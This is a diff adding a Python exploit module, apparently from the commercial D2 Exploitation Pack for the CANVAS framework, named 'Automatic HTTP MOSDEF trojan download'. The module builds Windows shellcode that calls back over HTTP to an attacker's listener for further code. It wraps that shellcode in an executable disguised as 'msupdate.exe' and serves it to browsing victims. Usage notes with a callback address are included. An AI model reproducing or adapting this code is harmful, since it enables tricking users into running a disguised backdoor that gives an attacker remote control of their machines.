@@ -1,0 +1,115 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "Automatic HTTP MOSDEF trojan download"
+
+DESCRIPTION = "Automatic HTTP MOSDEF trojan download"
+DOCUMENTATION = {}
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['2000','XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_download -l 192.168.41.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows 2000 SP4, XP SP0-SP2'],
+}
+
+	
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.name = NAME 
+        self.trojanname = "msupdate.exe"
+        self.filename = "index.html"        
+        return
+
+    def maketrojan(self):
+        host = self.callback.ip
+        port = self.callback.port
+
+        sc = shellcodeGenerator.win32()
+        sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+        ssl = ""
+        sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+        shellcode = sc.get()        
+        myPElib = pelib.PElib()
+	
+        self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+        
+        self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+        
+        self.setInfo("%s - done" % (NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan()
+        
+        self.log("Sending MOSDEF trojan")
+        self.log("Sending %d bytes" % len(self.mosdeftrojan))
+        h.addHeader("Content-type", "application/octet-stream")
+        h.addHeader("Content-Disposition", "inline; filename=" + self.trojanname)
+        h.addHeader("Connection", "close")
+        b.setBody(self.mosdeftrojan)
+               
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+            
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
